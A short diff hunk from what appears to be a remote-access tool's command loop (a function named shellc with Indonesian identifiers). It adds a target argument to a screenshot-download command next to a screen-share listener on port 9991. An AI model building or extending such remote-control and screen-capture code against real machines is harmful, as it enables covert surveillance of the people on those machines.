@@ -273,7 +273,7 @@ def shellc():
                 konversi_byte_stream()
             elif perintah ==  'screen_shot':
                 n += 1
-                download_file("ss"+str(n)+".png")
+                download_file(_target,"ss"+str(n)+".png")
             elif perintah == 'screen_share':
                 screen_record(host='0.0.0.0', port=9991) 
             elif perintah == 'help':
